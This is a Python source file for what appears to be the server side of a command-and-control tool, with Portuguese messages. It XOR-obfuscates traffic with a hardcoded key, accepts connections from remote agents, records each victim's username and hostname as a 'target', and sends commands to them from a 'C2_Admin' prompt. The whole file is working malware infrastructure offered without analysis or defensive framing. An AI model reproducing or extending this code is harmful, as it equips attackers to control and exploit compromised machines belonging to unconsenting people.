import socket
import threading
import json

CRYPTO_KEY = b"D33pH4t_S3cr3t"

class CryptoLayer:
    @staticmethod
    def crypt(data: bytes) -> bytes:
        output = bytearray()
        for i in range(len(data)):
            output.append(data[i] ^ CRYPTO_KEY[i % len(CRYPTO_KEY)])
        return bytes(output)

    @staticmethod
    def send_secure_packet(sock, data_dict: dict):
        try:
            json_data = json.dumps(data_dict).encode('utf-8')
            encrypted_data = CryptoLayer.crypt(json_data)
            payload_size = len(encrypted_data).to_bytes(4, byteorder='big')
            sock.sendall(payload_size + encrypted_data)
        except Exception as e:
            print(f"[!] Erro ao enviar pacote: {e}")

    @staticmethod
    def _recv_exact(sock, n: int) -> bytes:
        buf = bytearray()
        while len(buf) < n:
            chunk = sock.recv(n - len(buf))
            if not chunk:
                return b""
            buf.extend(chunk)
        return bytes(buf)

    @staticmethod
    def receive_secure_packet(sock) -> dict:
        try:
            header = CryptoLayer._recv_exact(sock, 4)
            if len(header) < 4:
                return None
            payload_size = int.from_bytes(header, byteorder='big')
            if payload_size <= 0 or payload_size > 1048576:
                return None

            encrypted_data = CryptoLayer._recv_exact(sock, payload_size)
            if len(encrypted_data) < payload_size:
                return None

            decrypted_data = CryptoLayer.crypt(encrypted_data)
            return json.loads(decrypted_data.decode('utf-8'))
        except Exception:
            return None

class TransportEngine:
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.running = False
        self.sessions = {}

    def start_listener(self):
        self.server_sock.bind((self.host, self.port))
        self.server_sock.listen(50)
        self.running = True
        threading.Thread(target=self._accept_loop, daemon=True).start()

    def _accept_loop(self):
        session_counter = 0
        while self.running:
            try:
                client, addr = self.server_sock.accept()
                session_counter += 1
                self.sessions[session_counter] = {
                    "sock": client, "addr": addr, "username": "Carregando...", "hostname": "Carregando..."
                }
                threading.Thread(target=self._handle_client, args=(session_counter, client, addr), daemon=True).start()
            except:
                break

    def _handle_client(self, session_id, client, addr):
        try:
            pkg_registro = CryptoLayer.receive_secure_packet(client)
            if pkg_registro and pkg_registro.get("status") == "register":
                self.sessions[session_id]["username"] = pkg_registro.get("username", "Desconhecido")
                self.sessions[session_id]["hostname"] = pkg_registro.get("hostname", "Desconhecido")
                print(f"\n\n[+] Nova sessão ativa: ID [{session_id}] | Alvo: {self.sessions[session_id]['username']}@{self.sessions[session_id]['hostname']} ({addr})")
                print("C2_Admin> ", end="", flush=True)
        except Exception:
            self.remove_session(session_id)

    def transmit(self, session_id, method, params=None):
        if session_id not in self.sessions:
            return {"status": "error", "message": "Sessao inativa."}
        if params is None: params = {}
        
        sock = self.sessions[session_id]["sock"]
        payload = {"method": method, "params": params}
        
        CryptoLayer.send_secure_packet(sock, payload)
        resposta = CryptoLayer.receive_secure_packet(sock)
        if resposta:
            return resposta
        return {"status": "error", "message": "Sem resposta do agente."}

    def remove_session(self, session_id):
        if session_id in self.sessions:
            try: self.sessions[session_id]["sock"].close()
            except: pass
            del self.sessions[session_id]

    def cleanup(self):
        self.running = False
        self.server_sock.close()
        for sid, data in list(self.sessions.items()):
            try: data["sock"].close()
            except: pass
